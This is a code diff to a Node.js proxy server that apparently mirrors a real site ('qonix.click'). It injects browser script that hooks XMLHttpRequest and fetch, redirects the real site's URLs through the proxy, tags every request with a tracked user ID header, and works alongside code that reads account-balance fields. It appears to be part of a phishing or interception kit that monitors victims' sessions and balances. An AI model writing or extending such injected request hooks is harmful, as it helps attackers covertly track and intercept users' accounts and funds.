@@ -730,7 +730,7 @@ async function proxyToReal(req) {
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
-    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl === 'x-px-uid' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || kl.startsWith('x-px-')) continue;
     fwd[k] = v;
   }
   fwd['host'] = 'qonix.click';
@@ -865,7 +865,9 @@ app.all('/xxapi/*', async (req, res) => {
     }
 
     let userId = '';
-    if (respData && typeof respData === 'object') userId = findNumericId(respData, 0);
+    const pxUid = req.headers['x-px-uid'] || '';
+    if (pxUid && /^\d{3,12}$/.test(pxUid)) userId = pxUid;
+    if (!userId && respData && typeof respData === 'object') userId = findNumericId(respData, 0);
     if (!userId) userId = findNumericId(jsonResp, 0);
     if (!userId) userId = findNumericId(reqBody, 0);
     if (!userId) userId = await resolveUserId(req);
@@ -1099,7 +1101,9 @@ if(typeof u==='string'&&u.indexOf(REAL)===0){
 u=P+u.substring(REAL.length);
 arguments[1]=u;}
 this._hu=u;this._hm=m;
-return _open.apply(this,arguments);};
+var ret=_open.apply(this,arguments);
+if(UID){try{this.setRequestHeader('x-px-uid',UID);}catch(e){}}
+return ret;};
 
 var BAL_KEYS=['iToken','itoken','balance','userBalance','availableBalance','totalBalance','money','tokenBalance','usermoney','memberBalance','myBalance','walletBalance','accountBalance','coinBalance'];
 var _cachedBal=null;
@@ -1165,6 +1169,9 @@ if(url.indexOf(REAL)===0){
 var nu=P+url.substring(REAL.length);
 if(typeof input==='string'){arguments[0]=nu;}
 else{arguments[0]=new Request(nu,input);}}
+if(UID){if(!init)init={};if(!init.headers)init.headers={};
+if(init.headers instanceof Headers){init.headers.set('x-px-uid',UID);}
+else{init.headers['x-px-uid']=UID;}arguments[1]=init;}
 return _fetch.apply(this,arguments).then(function(resp){
 try{var cl=resp.clone();
 cl.text().then(function(t){
